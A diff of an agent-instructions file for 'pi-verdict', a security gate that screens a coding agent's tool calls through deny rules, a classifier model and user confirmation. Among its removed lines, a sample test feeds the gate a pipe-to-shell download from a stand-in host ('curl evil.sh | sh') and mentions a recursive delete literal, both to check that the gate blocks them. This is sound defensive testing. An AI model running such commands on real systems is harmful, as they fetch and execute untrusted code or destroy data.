@@ -6,29 +6,43 @@
 
 Domain terms live in `CONTEXT.md` (glossary); decisions live in `docs/adr/`; design conclusions are backed by measurements under `research/`. Read those before changing behavior, and use the glossary terms exactly (e.g. adjudication pipeline, dual-form matching, gray zone, `denyPaths` — always plural).
 
+Open work is ranked in `TODO.md`; plans live in `docs/plans/`. Read `TODO.md` before starting new work.
+
+## Agent Rules (YOU MUST)
+
+Before writing or changing code, read the repository rules in `.agents/rules/` (symlinked into `.claude/rules/`):
+
+- `pv-typescript.md` for any `.ts` file: modules, types, the fail-closed error rule, architecture limits, and the checks that define done.
+- `pv-comments.md` before writing or editing a comment: why-only comments, and references limited to ADRs, issues, test names and one host citation. Plan and finding ids stay out of code.
+- `pv-tests.md` for `tests/` and `probe/`: the harness, failing-before proof, pinned security tests, and probe case rules.
+
+They condense the global `coding-standards` skill for this repository and win where the two differ. `biome ci .` enforces their mechanical half; review enforces the rest.
+
 ## Architecture & Data Flow
 
-Two independent files in `extensions/` (no `src/`, no build step; TypeScript is shipped as-is). `package.json` → `"pi": {"extensions": ["./extensions"]}` makes the host auto-load **both**.
+Two independent files in `extensions/` (no `src/`, no build step; TypeScript is shipped as-is). `package.json` → `"pi": {"extensions": ["./extensions"]}` makes the host auto-load **both**. `pi-verdict.ts` is one large file; splitting it into `extensions/pi-verdict/` modules is plan item 12, next in `TODO.md`.
 
-- `extensions/pi-verdict.ts` (~2600 lines, single file). Default export `autoMode(pi, deps: AutoModeDeps = {})`.
-- `extensions/jev-adapter.ts` (~470 lines). Default export `jevAdapter(pi)`. Registers provider `typesafe` / model `typesafe/jev-latest` (non-generative "typed decision" classifier backend, ADR-0003). Inert if `pi.registerProvider` is absent. `pi-verdict.ts` value-imports helpers from it (`activeTransport`, `parseJevReason`, `parseJevConfidence`, `streamDecisions`, `TRANSPORT_DEFAULTS`, `USER_RULES_HEADER`, `PROVIDER_ID`) but does not load it as an extension.
+- `extensions/pi-verdict.ts`. Default export `autoMode(pi, deps: AutoModeDeps = {})`.
+- `extensions/jev-adapter.ts`. Default export `jevAdapter(pi)`. Registers provider `typesafe` / model `typesafe/jev-latest` (non-generative "typed decision" classifier backend, ADR-0003). Inert if `pi.registerProvider` is absent. `pi-verdict.ts` value-imports helpers from it but does not load it as an extension.
 
 **Host hooks** (all inside `autoMode`): flags `auto-mode` (default on), `auto-mode-model`, `auto-mode-debug` (also env `PI_AUTO_MODE_DEBUG=1`); `session_start` (project-trust prompt, `SessionState.reset()`, shortcut registration, audit prune); `tool_call` (the gate); commands `/automode` (on|off|status) and `/verdict` (interactive config editor, needs UI); toggle shortcut (default `ctrl+shift+a`).
 
-**Pipeline** — pure, UI-free `adjudicate(state, call, env) → Verdict`, called from the `tool_call` handler:
+**Pipeline** — pure, UI-free `adjudicate(state, call, env) → Verdict`, called from the `tool_call` handler. `docs/layers.md` is the authoritative layer map, and the probe asserts it; change both together.
 
-1. `classifyByRules` → `RuleResult{allow|deny|gray|ask}`, in this order: self-protection layer 0 (ADR-0005: a hard, config-exempt deny over the gate's own files) → built-in deny floor (`BASH_DANGER_RULES`, path sensitivity S0–S5 via `classifyPath`; off with `builtinDenyFloor:false`) → user `deny` regexes → forced `.omp` gate (`gateOmpDir`, default off) ask → `denyPaths` ask → user `allow` regexes → `tools` exact-name allowlist → gray. Deny beats allow. There is **no built-in allowlist** (`research/rule-layer-security-audit.md`).
-2. Gray zone → `classifyWithModel` (per-attempt cap `CLASSIFIER_TIMEOUT_MS`, inside the end-to-end adjudication budget `ADJUDICATION_BUDGET_MS` — item 7; a timed-out attempt is never retried). Response MUST start with `<verdict>allow|ask|deny</verdict>` (verdict prefix contract) or it fails closed.
+1. `classifyByRules` → `RuleResult{allow|deny|gray|ask}`. Every file-tool layer reads its targets from the tool-access adapter `toolAccess` (ADR-0009), graded in every form the host can resolve the path to (`hostPathForms`), worst grade winning. Order: self-protection (ADR-0005: a hard, config-exempt deny over the gate's own files) → built-in deny floor (`BASH_DANGER_RULES`, path sensitivity S0–S5 via `classifyPath`; off with `builtinDenyFloor:false`) → user `deny` regexes → forced `.omp` gate (`gateOmpDir`, default off) ask → `denyPaths` ask (also a call the strict redactor matches) → over-cap action ask → user `allow` regexes / `tools` exact-name exemption → opaque-call ask → gray. Deny beats allow. There is **no built-in allowlist** (`research/rule-layer-security-audit.md`).
+2. Gray zone → `classifyWithModel` (per-attempt cap `CLASSIFIER_TIMEOUT_MS`, inside the end-to-end budget `ADJUDICATION_BUDGET_MS`; a timed-out attempt is never retried). Response MUST start with `<verdict>allow|ask|deny</verdict>` (verdict prefix contract) or it fails closed.
 3. Post-classifier: `confidenceDemotion` (`classifierMinConfidence`, jev only) → `runConfidenceCascade` to `classifierFallbackModel` (`enforce` default | `shadow`; a demoted deny can never become an auto allow; ADR-0004).
-4. Presentation: single point `presentVerdict` (templates keyed by `source × degraded`). Block text via `blockedReason(tag, detail)` → `[auto-mode <tag> block] BLOCKED — ...`. `Verdict.detail` is UI-only; protected-path plaintext MUST NOT reach the agent, notifications, or the classifier (ADR-0002 existence hint only). Asks go through `confirmAsk` (rich dialog → `AskDecision`): Yes / No / "No, with explanation…" (user text → `declineDetail` → block reason) / "Explain…" (EXPLAIN-GATE role, `explainGate`; display-only output, **never offered for protected-path asks** — same ADR-0002 rule). `buildApproveDialog` also parses SGR left-clicks (`dialogLineAtRow` maps the click row via the host's `children`/`terminal.rows`/`viewportTop`): a click highlights, a second click on the same mouse-highlighted row confirms; keyboard input disarms; it never writes mouse-mode sequences and is inert on hosts that don't forward mouse input (pi 0.84.3's `TuiAltScreen` consumes it first). During a gray-zone model call the `tool_call` handler shows a one-row status widget (`ui.setWidget("verdict", …)`, fed by the UI-free `AdjudicateEnv.onPhase` hook; phase + tool + model id only, never command/path text) and clears it before presenting the verdict.
+4. Presentation: single point `presentVerdict` (templates keyed by `source × degraded`). Block text via `blockedReason(tag, detail)` → `[auto-mode <tag> block] BLOCKED — ...`. `Verdict.detail` is UI-only; protected-path plaintext MUST NOT reach the agent, notifications, or any model (ADR-0002 existence hint only). Asks go through `confirmAsk` (rich dialog → `AskDecision`): Yes / No / "No, with explanation…" (user text → `declineDetail` → block reason) / "Explain…" (EXPLAIN-GATE role, `explainGate`; display-only output, **never offered for protected-path asks** — same ADR-0002 rule). Before changing the dialog's mouse handling or the gray-zone status widget, read `docs/host-contract.md`, which records the host metrics they depend on.
 
 **Fail direction**: closed. Classifier error / timeout / no model / malformed output ⇒ deny (`source:"fail-closed"`). No UI (`pi -p`, json, rpc) ⇒ every `ask` degrades to deny with `degraded:true`. Config errors ⇒ empty rules with the floor ON plus a notification, **and `policyDegraded` (ADR-0010): a config parse/load failure, a trusted-project parse/shape failure, or any skipped `deny`/`denyPaths` entry withholds every model-originated allow — first layer + cascade → ask (`source:"degraded-policy"`), subagent second model → denied outright — and suspends user `allow`/`tools` for the session; named in the footer badge, `/automode`, every block reason, and a session-start warning**. The extension is never disabled. Audit write failures are fail-soft.
 
-**State**: `SessionState` class (exported for tests) holds fallback stats, `userRules`, audit log, and `denyPathBases`. `reset()` is the single reset list — add any new per-session state there. Module-level caches: `completionCache` (WeakMap per registry), `TEMPERATURE_REJECTED_MODELS`, lazy `dialogModules`.
+**Subagents** (omp): a subagent session's ask goes to the root session's UI (`rootUi`); with no root UI, or `subagentGate: "auto"`, it resolves without a human through `resolveAskWithoutHuman`, which consults `classifierFallbackModel` and denies everything else.
 
-**Dual host**: real pi and omp. Adapter detects omp by `"logger" in pi && "typebox" in pi`. Model calls go through `ctx.modelRegistry.complete` when present, else the `compatLoader` fallback (omp 18 shape). `[pi-verdict local patch: …]` comment tags mark divergences from upstream `jesset/pi-verdict`.
+**State**: `SessionState` class (exported for tests) holds fallback stats, `userRules`, audit log, `policyDegraded`, and `denyPathBases`. `reset()` is the single reset list — add any new per-session state there. Module-level caches: `completionCache` (WeakMap per registry), `TEMPERATURE_REJECTED_MODELS`, lazy `dialogModules`.
 
-**Config**: `<agentDir>/config/pi-verdict.json` (user), written from `USER_CONFIG_TEMPLATE` on first run; project override `<project>/.omp|.pi/pi-verdict.json`, applied only if trusted (`<agentDir>/config/pi-verdict-trust.json`). `agentDir` = `PI_CODING_AGENT_DIR` if set, else self-anchored from the install path (`resolveAgentDir`), fallback `~/.pi/agent`; never probe the host dir tree. Keys: `allow`, `deny`, `tools`, `denyPaths`, `builtinDenyFloor`, `gateOmpDir`, `autoDeny`, `classifierModel`, `explainGateModel`, `explainGatePrompt`, `toggleShortcut`, `audit`, `notifyAllows`, `classifierMinConfidence`, `classifierFallbackModel`, `classifierFallbackMode`, `rules`, `_hint`. Defaults: `EMPTY_RULES`. Audit (opt-in): `<agentDir>/verdicts/<sessionId>.jsonl`.
+**Dual host**: real pi and omp. Adapter detects omp by `"logger" in pi && "typebox" in pi`. Model calls go through `ctx.modelRegistry.complete` when present, else the `compatLoader` fallback (omp 18 shape). `[pi-verdict local patch: …]` comment tags mark divergences from upstream `jesset/pi-verdict`. The omp host source for path and loader behavior is cloned under `.scratch/research/oh-my-pi` (git-ignored); check its version against the installed `omp --version` before citing it.
+
+**Config**: `<agentDir>/config/pi-verdict.json` (user), written from `USER_CONFIG_TEMPLATE` on first run; project override `<project>/.omp|.pi/pi-verdict.json`, applied only if trusted (`<agentDir>/config/pi-verdict-trust.json`), and only in the narrowing direction (ADR-0006). `agentDir` = `PI_CODING_AGENT_DIR` if set, else self-anchored from the install path (`resolveAgentDir`), fallback `~/.pi/agent`; never probe the host dir tree. Every key, its default and its override direction are documented in `docs/configuration.md`; defaults live in `EMPTY_RULES`. Audit (opt-in): `<agentDir>/verdicts/<sessionId>.jsonl`.
 
 ## Key Directories
 
@@ -38,7 +52,8 @@ Two independent files in `extensions/` (no `src/`, no build step; TypeScript is 
 | `tests/` | `bun:test` suites, one per extension file |
 | `probe/` | The shared gate-testing contract: `cases.ts` (the case table), `probe.ts` (three-run runner), `fixtures.ts`, `consumer-policy.json`, `README.md`. Dev artifact; not shipped |
 | `tools/` | `provenance.ts`, `coverage.ts` (generates `docs/coverage.md`), `release-check.ts`. Dev artifacts; not shipped |
-| `docs/` | `configuration.md`, `security-principles.md`, `layers.md` (the layer map the probe asserts), `coverage.md` (generated), `plans/` (tracked plans), `adr/` (NNNN-*.md), `handover-*` archives, `agents/` (skill config, not product docs), `images/`, `demo.gif` |
+| `docs/` | `configuration.md`, `security-principles.md`, `layers.md` (the layer map the probe asserts), `host-contract.md`, `coverage.md` (generated), `plans/` (tracked plans), `adr/` (NNNN-*.md), `agents/` (skill config, not product docs), `images/`, `demo.gif` |
+| `.agents/rules/` | Repository rules for agents (`pv-*.md`); `.claude/rules/` holds symlinks to them |
 | `research/` | Evidence notes + offline sims (`cache-sim/`, `rule-engine-sim/`); not part of tests/typecheck |
 | `scripts/` | `demo.tape` (vhs recording of `docs/demo.gif`; macOS/zsh/RamDisk-specific) |
 | `.github/workflows/` | `ci.yml`, `publish.yml` |
@@ -57,84 +72,38 @@ bun run provenance          # sha256 of the committed extension blobs at HEAD
 bun run release-check       # package.json version == annotated tag v<version> (local pre-tag gate)
 ```
 
-`lint`/`format` scripts exist (`mise exec -- biome …`) and `biome.json` is the config; CI runs `biome ci .`, so probe/ and tools/ must pass the same strict rules (no `any`). Run `bun run typecheck`, `bun test`, and `bun run probe` after any change to `extensions/`, `probe/`, or `tools/`. For headless smoke-testing of a build, see "Smoke-testing" below.
+`lint`/`format` scripts exist (`mise exec -- biome …`) and `biome.json` is the config; CI runs `biome ci .` over `extensions/`, `tests/`, `probe/` and `tools/` (`tests/` alone may use `any`). Run the full set in `pv-typescript.md`'s "Done" after any change to `extensions/`, `probe/`, or `tools/`. For headless smoke-testing of a build, see "Smoke-testing" below.
 
-## Coding Standards (YOU MUST)
+## Domain Conventions
 
-Load the `coding-standards` skill before writing or changing code — `extensions/`, `tests/`, `probe/`, `tools/` — and
-load its `references/comments.md` before writing or rewriting a comment, and `references/testing-standards.md`
-when writing or restructuring tests. Its defaults govern wherever this file and the language rules leave a choice
-undecided; established repository patterns still win over a default.
-
-Two rules from that skill this repository has broken before:
-
-- **A comment explains why, not what.** If a better name removes the need, rename instead of commenting. Delete a
-  comment that restates the line beneath it rather than rewording it. No markdown emphasis, no commented-out
-  code, no process narration ("round 2", "a later review found…") — record the resulting choice and why it
-  holds. The section banners described below are the one sanctioned divider.
-- **A reference must resolve inside the repository.** In source comments and test titles, cite a tracked
-  artifact: an issue (`#NN`), an ADR (`ADR-000N`), a plan item or finding id (`item 6b`, `Phase 5`, `F13`),
-  or a test name. The test is whether a reader can open the text the id labels — a finding id is only as good
-  as the document that defines it, so qualify it when more than one report numbers findings (`arch-F2`; the
-  plan cites its own `F*`/`R2-*` inline at the paragraph that carries them). A tag whose report lives only in
-  the gitignored `.scratch/`, with its text nowhere tracked, does not resolve — the round tags `S-F5`, `R-F1`
-  and `C3` are the cautionary example; put that provenance in the commit message instead. `CHANGELOG.md` and
-  `docs/adr/` keep their existing convention of plan-resolvable finding ids.
-
-`biome ci .` enforces the mechanical half of the skill; the review gates enforce the rest.
-
-## Code Conventions & Common Patterns
-
-- ESM, `node:`-prefixed imports, tab indentation, TypeScript `strict`. Relative imports carry the `.ts` extension.
-- Sections use banner comments (`// ====…` + title). Issue refs `#NN`, ADR refs `ADR-000N`, and glossary terms appear in comments. A comment saying "pinned by a regression test" means don't loosen the behavior without updating that test.
-- Language: comments, docs, CHANGELOG, release notes, README in English. Older code/docs are Chinese — convert when you touch them, don't mass-rewrite.
-- Technical writing uses standard terminology; no invented colloquial metaphors (annotate a short form with its precise meaning on first use).
+- Language: comments, docs, CHANGELOG, release notes, README in English. Technical writing uses standard terminology; no invented colloquial metaphors (annotate a short form with its precise meaning on first use).
 - Path matching is **dual-form**: lexical + realpath (`baseForms`; `rebuiltForms` additionally rebuilds from the nearest existing ancestor and is used by the path-sensitivity floor only). `denyPaths` MUST NOT use ancestor rebuild (pinned by a test). Compare case-folded on win32/darwin via `fold`.
-- `toolKind()` maps tool name → `"command" | "file" | null`; adding a file-type tool means extending it. `grep`/`find`/`ls` are scope tools (subtree semantics, empty path = cwd).
-- Regexes in rules are capped at `BASH_MAX_MATCH_LEN=8192`; longer commands fall through to the classifier.
-- DI seams: `adjudicate` takes all deps in `AdjudicateEnv` (`getModel`, `complete`, `host`, `signal`, `getFallbackModel`); `autoMode(pi, {compatLoader})`; `streamDecisions(…, fetcher = fetch)` and `createJevProvider(keyResolver, fetcher)` inject `fetch`. Keep new logic UI-free and injectable the same way.
-- Notifications are prefixed `🛡️`. Deny/ask always notify; classifier allow only with `notifyAllows`; mechanical allows are silent.
-- Dangerous literals in code/tests are built by concatenation (e.g. `"rm " + "-rf /tmp/x"`) so the file doesn't trip its own rules.
+- Host path spellings are graded through `hostPathForms` (raw form plus omp's `expandPath`, read selectors, `?q=` image questions, shell-escaped spaces, WSL drive aliases); ADR-0009 records the accepted residual spellings. Add a spelling there, not in a single layer.
+- Scope tools (`SCOPE_TOOL_NAMES`: `grep`, `find`, `ls`, `glob`, `ast_grep`, `ast_edit`) have subtree semantics; an empty path is the cwd. A target holding a glob metacharacter never yields a rule allow, except an in-project `glob` listing.
+- Regexes in rules are capped at `BASH_MAX_MATCH_LEN=8192`; longer commands fall through to the over-cap ask.
+- DI seams beyond `AdjudicateEnv`: `autoMode(pi, {compatLoader})`; `streamDecisions(…, fetcher = fetch)` and `createJevProvider(keyResolver, fetcher)` inject `fetch`.
+- Notifications: deny/ask always notify; a classifier allow only with `notifyAllows`; mechanical allows are silent.
 
 ## Important Files
 
-- `extensions/pi-verdict.ts` — gate: `adjudicate`, `classifyByRules`, `SessionState`, `presentVerdict`, `USER_CONFIG_TEMPLATE`, `DEFAULT_ALLOWED_TOOLS`, `autoMode`.
+- `extensions/pi-verdict.ts` — gate: `adjudicate`, `classifyByRules`, `toolAccess`, `hostPathForms`, `SessionState`, `presentVerdict`, `USER_CONFIG_TEMPLATE`, `DEFAULT_ALLOWED_TOOLS`, `autoMode`.
 - `extensions/jev-adapter.ts` — jev provider/transport (env `PI_VERDICT_JEV_TRANSPORT` = `openrouter|typesafe`, `PI_VERDICT_JEV_URL`, keys `OPENROUTER_API_KEY` / `TYPESAFE_API_KEY`).
 - `package.json` — `files` whitelist (a new runtime file under `extensions/` MUST be added or it won't publish), version, peer dep `@earendil-works/pi-coding-agent >=0.84.0` (optional; dev-pinned 0.84.3).
 - `tsconfig.json` — `paths` maps the pi package to `node_modules/.../dist/index.d.ts`.
-- `CONTEXT.md`, `docs/adr/` (0001 superseded/removed; 0002 denyPaths; 0003 jev adapter; 0004 fallback cascade), `docs/configuration.md`, `CHANGELOG.md`.
+- `CONTEXT.md`, `docs/adr/`, `docs/configuration.md`, `CHANGELOG.md`.
 
 ## Runtime/Tooling Preferences
 
-- **Bun** is the package manager and test runner (`bun.lock` committed). **TypeScript** (`tsc`) for typechecking only. Node 22 is used only in `publish.yml` for `npm pack/publish`.
+- **Bun** is the package manager and test runner (`bun.lock` committed; it records no package version, so a version bump leaves it unchanged). **TypeScript** (`tsc`) for typechecking only. Node 22 is used only in `publish.yml` for `npm pack/publish`.
 - Zero runtime dependencies; the pi package is an optional peer dep. Don't add runtime deps without a strong reason.
-- Package name is `@jonatsu/pi-verdict` (renamed from `@frapetti-dev/pi-verdict`). The deployment installs via the git spec; GitHub Packages publishing requires the scope to match `@jonatsu`, which `publish.yml` now does.
+- Package name is `@jonatsu/pi-verdict` (renamed from `@frapetti-dev/pi-verdict`). The deployment installs via the git spec; GitHub Packages publishing requires the scope to match `@jonatsu`.
 - CI (`ci.yml`): `bun install --frozen-lockfile` → `bun run typecheck` → `biome ci .` → `bun test` → `bun run probe` → `bun run coverage && git diff --exit-code docs/coverage.md`. Publish (`publish.yml`, on GitHub Release): tag must equal `v` + `package.json` version and HEAD must be the tag commit, then typecheck + test + publish.
-- Dev workstation is Windows; `PI_CODING_AGENT_DIR` and home-relative fixtures must work cross-platform (Windows path separators are handled in code).
+- Dev workstation is Windows with WSL2; `PI_CODING_AGENT_DIR` and home-relative fixtures must work cross-platform (Windows path separators are handled in code).
 
 ## Testing & QA
 
-- Runner `bun:test` (`describe, test, expect, beforeAll, afterAll, afterEach`). `tests/pi-verdict.test.ts` (~200 tests) and `tests/jev-adapter.test.ts` (~40). `tests/` is **not** typechecked; `probe/` and `tools/` are (they are `tsc`-included and biome-strict). No coverage threshold.
-- `bun run probe` is the shared case-table contract (see `probe/README.md`): one case asserts the layer that decides a call, across three runs (A headless, B interactive, C consumer policy). A case tagged `known: "open"` must fail today; the runner **exits 1 if an open case passes** (remove the marker instead). `--filter "<label>"` runs a subset. `docs/coverage.md` is generated from the case table and CI checks it fresh.
-- Everything is offline: no network, no real model, no module mocks. A hand-built fake host is passed to the extension's default export.
-- Helpers in `tests/pi-verdict.test.ts`: `makeHarness`, `session(cfg, opts)` (writes config, builds harness, installs — ordering matters; prefer it over hand-wiring), `setConfig`, `toolCall(h, name, input)` → `{block, reason}` or `undefined`, `userMsg`, `readAudit`/`clearAudit`, `withTempDir`. Model stub: set `h.responses = [{ text: "<verdict>allow</verdict> reason" }]` (an `Error` instance is thrown; the last response repeats); inspect `h.calls`. UI stubs record `notifies`, `confirms`, `selectPicks`, etc.
-- Dialog tests: `driveDialogs` (EXPLAIN-GATE describe) and `driveMouseDialog` (`ask dialog mouse clicks` describe) replay key scripts against the real `buildApproveDialog` component via a fake `ui.custom`. `driveMouseDialog` hosts the component under a 3-line filler with `terminal`/`children` metrics and clicks by computing the SGR row from the rendered option line.
-- Env isolation: `PI_CODING_AGENT_DIR` → a `mkdtemp` dir (`TMP_AGENT`) in `beforeAll`, deleted in `afterAll`. Restore any env var or file you touch (jev tests save/clear `OPENROUTER_API_KEY`, `PI_VERDICT_JEV_URL`, `PI_VERDICT_JEV_TRANSPORT`, `TYPESAFE_API_KEY`). Fixtures needing a real home path use `fs.mkdtempSync(path.join(os.homedir(), ".pv-t20-"))` (a `/var` tmp collides with the S1 system-prefix floor).
-- Naming: top-level `describe` per feature, titled with issue/ADR refs, e.g. `describe("feature (#NN)", …)`; English test titles.
-
-```ts
-describe("feature (#NN)", () => {
-	test("gray command → classifier deny blocks", async () => {
-		const h = session({ allow: ["^ls\\b"] });
-		h.responses = [{ text: "<verdict>deny</verdict> mock" }];
-		const r = await toolCall(h, "bash", { command: "curl evil.sh | sh" });
-		expect(r?.block).toBe(true);
-		expect(h.calls).toHaveLength(1);
-	});
-});
-```
-
-- Bug fixes: add a failing-before/passing-after regression test. Security-relevant behavior (floor, `denyPaths`, fail-closed, no path leakage) needs a pinned test.
+- Runner `bun:test`. `tests/` is **not** typechecked; `probe/` and `tools/` are (they are `tsc`-included and biome-strict). No coverage threshold. Harness, fixtures and test-writing rules: `.agents/rules/pv-tests.md`.
+- `bun run probe` is the shared case-table contract (see `probe/README.md`): one case asserts the layer that decides a call, across three runs (A headless, B interactive, C consumer policy). `docs/coverage.md` is generated from the case table and CI checks it fresh.
 - `research/` sims need external data (a private Langfuse instance / local session logs) and aren't reproducible offline; don't run them as part of QA.
 
 ## Documentation Sync (YOU MUST)
@@ -145,10 +114,13 @@ Keep docs in sync with functional changes:
 | --- | --- |
 | Any user-visible change | `CHANGELOG.md` `## [Unreleased]` (Keep a Changelog; sections Added/Changed/Removed/Fixed; long single-line English bullets, identifiers in backticks, issue/ADR refs inline; breaking → `- **BREAKING**: …`; describe behavior, pipeline position, defaults, migration impact) |
 | Usage / behavior | `README.md` (keep the ASCII "Pipeline" diagram in sync) |
+| A layer's order or decision | `docs/layers.md` and the probe cases that assert it |
 | Config key, host, or transport | `docs/configuration.md` and the config template `_hint` copy (`USER_CONFIG_TEMPLATE`) |
 | Terminology | `CONTEXT.md` (terms only — no implementation detail or decisions) |
 | Architectural decision | new `docs/adr/NNNN-title.md` (next number; `status:` and `date:` block, then Context) |
 | A security principle changes | `docs/security-principles.md` |
+
+`CHANGELOG.md` and `docs/adr/` may cite plan item and finding ids that a tracked plan defines; code may not (`pv-comments.md`).
 
 ## Installed Copies (self-protection: ADR-0005; history in ADR-0001)
 
@@ -168,8 +140,9 @@ Spawn a sub-instance that loads only the repo copy, against a throwaway agent di
 
 ## Release
 
-- Sequence: `chore(release): bump version` commit (bump `package.json` version; keep `bun.lock` in sync) + annotated tag `vX.Y.Z` + GitHub Release. `gh release` commands are blocked by the built-in deny floor, so the user runs them from their own terminal.
-- Publishing is automated: Release published → `.github/workflows/publish.yml` (tag/version double-check + typecheck + tests + publish to GitHub Package Registry).
+- Sequence: `chore(release): bump version` commit (bump `package.json` version; move `## [Unreleased]` to `## [X.Y.Z] - <date>`) + annotated tag `vX.Y.Z` + `bun run release-check` + push + GitHub Release. `gh release` commands are blocked by the built-in deny floor, so the user runs them from their own terminal.
+- This checkout has two remotes (`origin` = `jonatsu/pi-verdict`, `frapetti` = upstream) and no `gh` default, so pass `-R jonatsu/pi-verdict` to every `gh` command.
+- Publishing is automated: Release published → `.github/workflows/publish.yml` (tag/version double-check + typecheck + tests + publish to GitHub Package Registry). The workflow runs as it stands at the tagged commit.
 
 ## Git & Workflow Conventions
 
@@ -177,4 +150,4 @@ Spawn a sub-instance that loads only the repo copy, against a throwaway agent di
 - [Conventional Commits](https://www.conventionalcommits.org/en/v1.0.0/) for messages. **Do not run `git commit` without the user's permission.**
 - Update CHANGELOG before merging to main.
 - Issues are GitHub issues managed via `gh` (`docs/agents/issue-tracker.md`); triage labels `needs-triage`, `needs-info`, `ready-for-agent`, `ready-for-human`, `wontfix` (`docs/agents/triage-labels.md`). Single-context domain docs: root `CONTEXT.md` + `docs/adr/` (`docs/agents/domain.md`).
-- To inspect another GitHub project's source, use `gh api`. When temporarily cloning an open-source project, use `/Volumes/RamDisk` instead of `/tmp`.
+- To inspect another GitHub project's source, use `gh api`. Clone an open-source project for research under `.scratch/research/` (git-ignored), never `/tmp`.
